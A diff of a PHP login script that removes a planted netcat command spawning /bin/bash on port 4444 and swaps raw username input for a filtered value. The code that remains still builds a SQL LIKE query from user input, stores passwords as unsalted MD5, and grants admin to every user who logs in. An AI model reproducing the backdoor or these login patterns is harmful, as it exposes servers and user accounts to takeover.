@@ -1,33 +1,29 @@
 <?php
 include "config.php";
-echo exec("nc 127.0.0.1 4444 -e /bin/bash");
-if(isset($_GET['logout'])){
+if(isset($_GET['logout']))
     session_destroy();
-}
+
 //login info taken into variables and password hashed in md5
 if(isset($_SESSION["username"]))
     header('Location: messages.php');
 
 if(isset($_POST['but_submit'])){
-    $uname = $_POST['txt_uname'];
+    $sanitized_c = filter_var($_POST['txt_uname'], FILTER_SANITIZE_STRING);
+    echo $sanitized_c;
     $password = hash('md5', $_POST['txt_pwd']);
 //connection if username and password are correct
-    if ($uname != "" && $password != ""){
+    if (!empty($sanitized_c) && !empty($password)){
         if(isset($file_db)){
-           $row =$file_db->query("select id,username,isAdmin FROM userSti where username like '$uname' and password like '$password' and isActive=1");
-            $row = $row->fetch();
-            if(isset($row['username'])){
+                $row =$file_db->query("select id,username,isAdmin FROM userSti where username like '$sanitized_c' and password like '$password' and isActive=1");
+                $row = $row->fetch();
+                if(isset($row['username'])){
                 $_SESSION["username"]=$row['username'];
                 $_SESSION["id"]=$row['id'];
                 $_SESSION["isadmin"]=1;
                 header('Location: messages.php');
             }
-
         }
-
-
     }
-
 }
 ?>
 <link href="css/signin.css" rel="stylesheet">
